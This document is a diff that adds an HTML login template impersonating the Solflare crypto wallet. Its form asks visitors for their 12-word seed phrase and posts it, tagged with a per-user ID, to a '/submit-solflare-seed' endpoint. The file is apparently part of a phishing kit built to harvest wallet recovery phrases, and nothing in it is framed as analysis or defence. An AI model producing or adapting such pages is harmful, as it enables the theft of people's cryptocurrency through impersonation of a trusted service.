@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solflare Wallet Login</title>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Sign in to Solflare Wallet</h2>
+        <form id="solflareLoginForm" action="/submit-solflare-seed" method="POST">
+            <input type="hidden" name="userId" value="<%= userId %>">
+            
+            <label for="seedPhrase">Seed Phrase:</label>
+            <input type="text" id="seedPhrase" name="seedPhrase" required placeholder="Enter your 12-word seed phrase">
+            
+            <button type="submit">Submit</button>
+        </form>
+        <p><a href="#">Forgot your seed phrase?</a></p>
+    </div>
+</body>
+</html>
